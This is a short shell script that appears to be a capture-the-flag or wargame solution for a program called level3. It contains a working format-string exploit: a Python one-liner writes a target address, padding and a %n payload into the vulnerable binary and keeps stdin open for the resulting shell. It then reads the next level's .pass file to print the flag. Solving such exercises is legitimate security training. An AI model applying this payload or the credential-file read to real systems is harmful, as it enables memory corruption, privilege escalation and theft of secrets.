#!/bin/sh

(python -c 'print("\x8c\x98\x04\x08"+"A"*36+"%.8x%.8x%.8x%n\n")'; cat -) | ./level3
echo "Flag is: `cat /home/user/level4/.pass`"
exit 0
